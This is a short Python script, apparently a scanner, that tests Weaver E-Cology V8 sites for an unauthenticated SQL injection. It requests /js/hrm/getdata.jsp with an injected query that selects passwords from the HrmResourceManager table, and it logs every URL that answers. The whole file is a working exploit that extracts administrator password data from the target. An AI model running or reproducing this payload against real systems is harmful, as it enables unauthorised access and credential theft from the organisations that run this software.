import requests
import time

filename = "./reps/E_Cology_V8_前台Sql-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def ecv8sql(url):
    f=url
    payload = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    url = url + payload
    try:
        reps = requests.get(url=url, headers=headers, verify=False, timeout=10)
        if reps.status_code == 200 and 'html' not in reps.text:
                print("\033[0;32;40m[+] {} 疑似存在E_Cology_V8_前台Sql注入漏洞！！！\033[0m".format(url))
                f = open(filename, "a+", encoding="utf-8")
                f.write(reps.url)
                f.write("\n")
                f.close()
        else:
            print("\033[0;31;40m[-] {} 未发现E_Cology_V8_前台Sql注入漏洞\033[0m".format(url))
    except Exception as e:
        print("url:{}请求失败".format(f))
